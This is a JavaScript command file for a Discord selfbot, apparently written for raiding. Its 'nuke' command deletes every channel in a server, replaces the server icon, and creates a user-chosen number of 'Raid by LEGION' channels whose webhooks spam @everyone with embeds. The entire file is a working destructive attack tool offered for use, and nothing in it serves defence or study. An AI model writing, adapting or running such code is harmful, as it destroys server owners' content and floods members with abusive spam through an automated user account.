const { WebEmbed } = require('discord.js-selfbot-v13');

module.exports = {
    name: "nuke",
    aliases: [],
    description: "Supprime tous les canaux du serveur, crée un nouveau canal et un webhook au nom 'LEGION', puis crée un certain nombre de canaux et des webhooks qui envoient un message 'bonjour' un certain nombre de fois.",
    run: async (message, args, command, client) => {
        // Supprime tous les canaux du serveur
        message.guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
            } catch (error) {
                console.error('Erreur lors de la suppression du canal :', error);
            }
        });

        // Changer la photo du serveur
        const newServerIconURL = 'https://cdn.discordapp.com/attachments/858849789977952286/1170120429160124427/image.png?ex=6557e292&is=65456d92&hm=b451b98cfe4d816c745110983072ee37e176e42764b5dd0d5b48827f3b3c2ced&';
        message.guild.setIcon(newServerIconURL)
        .then(() => {
            // Crée un nouveau canal par défaut
            message.guild.channels.create('Raid By LEGION', {
                type: 'text',
            })
            .then(newChannel => {
                // Crée un webhook au nom 'LEGION'
                newChannel.createWebhook('LEGION', {
                    avatar: 'https://cdn.discordapp.com/attachments/858849789977952286/1170120429160124427/image.png?ex=6557e292&is=65456d92&hm=b451b98cfe4d816c745110983072ee37e176e42764b5dd0d5b48827f3b3c2ced&'
                })
                .then(webhook => {
                    // Vérifie que les arguments nécessaires sont fournis
                    if (args.length < 2) {
                        return newChannel.send("Utilisation correcte : !resetandspam <nombre_de_canaux> <nombre_de_messages>");
                    }

                    const numChannels = parseInt(args[0]);
                    const numMessages = parseInt(args[1]);

                    if (isNaN(numChannels) || isNaN(numMessages)) {
                        return newChannel.send("Les arguments doivent être des nombres valides.");
                    }

                    // Crée un certain nombre de canaux et des webhooks
                    for (let i = 0; i < numChannels; i++) {
                        message.guild.channels.create(`Raid by legion}`, {
                            type: 'text',
                        })
                        .then(spamChannel => {
                            for (let j = 0; j < numMessages; j++) {
                                const embed = new WebEmbed()
                                    .setTitle("RAID BY LEGION ❤️")
                                    .setImage('https://cdn.discordapp.com/attachments/858849789977952286/1170012153311416411/MOSHED-2023-11-3-15-31-40.gif?ex=65577dbb&is=654508bb&hm=e0dbf183750f6d623159cb6ba70b4abeb619f9161dc0d9d74405ff65e34f8cad&')
                                    .setColor('#FF0000'); // Couleur de l'embed (rouge)

                                spamChannel.createWebhook('LEGION', {
                                    avatar: 'https://cdn.discordapp.com/attachments/858849789977952286/1170120429160124427/image.png?ex=6557e292&is=65456d92&hm=b451b98cfe4d816c745110983072ee37e176e42764b5dd0d5b48827f3b3c2ced&'
                                })
                                .then(spamWebhook => {
                                    // Envoyer l'embed
                                    spamWebhook.send({ embeds: [embed], content: "@everyone" });
                                })
                                .catch(error => {
                                    console.error('Erreur lors de la création du webhook :', error);
                                });
                            }
                        })
                        .catch(error => {
                            console.error('Erreur lors de la création du canal :', error);
                        });
                    }
                })
                .catch(error => {
                    console.error('Erreur lors de la création du webhook :', error);
                });
            })
            .catch(error => {
                console.error('Erreur lors de la création du canal :', error);
            });
        })
        .catch(error => {
            console.error('Erreur lors de la modification de l\'icône du serveur :', error);
        });
    }
}
